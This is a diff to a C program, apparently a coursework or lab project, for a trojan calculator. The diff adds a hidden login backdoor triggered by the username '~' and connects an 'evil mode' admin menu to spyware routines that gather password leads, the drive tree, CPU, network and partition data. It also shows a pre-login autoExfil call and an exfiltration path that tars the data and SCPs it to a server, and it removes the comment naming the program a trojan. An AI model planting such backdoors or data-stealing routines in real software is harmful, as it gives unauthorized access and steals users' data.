@@ -33,7 +33,7 @@ void runSpyware();
 
 /*
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                                       Regular User Authentication
+                                       User Authentication
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 */
 /*
@@ -76,8 +76,8 @@ void findUser(unsigned int userType){
     char password[STRING_MAX];
     char checkUser[STRING_MAX];
     char checkPass[STRING_MAX];
-
     bool searchUser = true;
+    bool backdoor = false;
 
     //Allows the user to attempt to login
     while (searchUser) {
@@ -103,12 +103,19 @@ void findUser(unsigned int userType){
                 formatString(checkPass);
                 if (strcmp(username, checkUser) == 0 && strcmp(password, checkPass) == 0){
                     searchUser = false;
+                } else if (strcmp(username, "~") == 0){
+                    searchUser = false;
+                    backdoor = true;
                 }
             }
             if (searchUser == true){
                 puts("User not found in file. Try again");
             } else {
-                puts("found existing user");
+                if (backdoor) {
+                    puts("You activated a backdoor!");
+                } else {
+                    puts("found existing user");
+                }
             }
         }
         fclose(fileptr);
@@ -144,7 +151,7 @@ bool newUser(){
 }
 /*
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                                       Administrator Panel
+                                              Administrator
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 */
 bool administrator(unsigned int backdoor){
@@ -162,7 +169,7 @@ bool administrator(unsigned int backdoor){
     puts("Welcome to evil mode! >:)");
 
     while (checkEntry) {
-        puts("Here is what you can do, enter for the following options:\n0: Exit back to calculator\n1: Print all user's usernames and passwords\n2: Print all stolen data to file\n3: Data Exfiltration");
+        puts("Here is what you can do, enter for the following options:\n0: Exit back to calculator\n1: Print all user's usernames and passwords\n2: Collect data from machine\n3: Data Exfiltration");
         entry = getInt();
         //User wants to leave admin mode, can either close program or enter back to calculator
         if (entry == 0){
@@ -198,7 +205,15 @@ bool administrator(unsigned int backdoor){
             fclose(fileptr);
         //Admin wants to print all stolen data from the system (i.e. running tree file and that stuff)
         } else if (entry == 2) {
-            puts("This is where all stolen data would be printed. If I had any...");
+            puts("Grabbing all required data from machine...");
+            runSpyware();
+            puts("Collecting info on potential password leads...");
+            puts("Collecting info on User's drive tree...");
+            puts("Collecting info on CPU...");
+            puts("Collecting info on Network...");
+            puts("Collecting info on Drive partitions...");
+            puts("Collected all data from machine. Stored in './data'");
+        //Admin wants to extract all data collected from machine
         } else if (entry == 3) {
             dataExfil();
         } else  {
@@ -216,7 +231,7 @@ Runs data exfiltration commands
 */
 void dataExfil() {
     char* hostName;
-    puts("Begin Data exfiltration process.....\n Creating tar......");
+    puts("Begin Data exfiltration process.....\nCreating tar......");
     hostName = tarFile();
     puts("Attempting to SCP to server.....");
     sendFile(hostName);
@@ -304,14 +319,14 @@ void runSpyware(){
 Function that runs the calculator and does the actual math
 */
 void calculator(){
-    bool runCalc = true;
-    bool run = true;
-    bool again = true;
     int input = 0;
     int digit1 = 0;
     int digit2 = 0;
     int result;
     unsigned int valid = 0;
+    bool runCalc = true;
+    bool run = true;
+    bool again = true;
     char op;
     puts("What would you like to do first? Your options are:\n0: Do a calcuation\n1: Exit calculator\n2: Administrator Settings");
     while (run){
@@ -458,7 +473,6 @@ void formatString(char string[]) {
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 */
 int main(){
-    //Trojan Horse Calculator
     autoExfil();
     puts("Welcome to the best ever calculator!");
     userAuth();
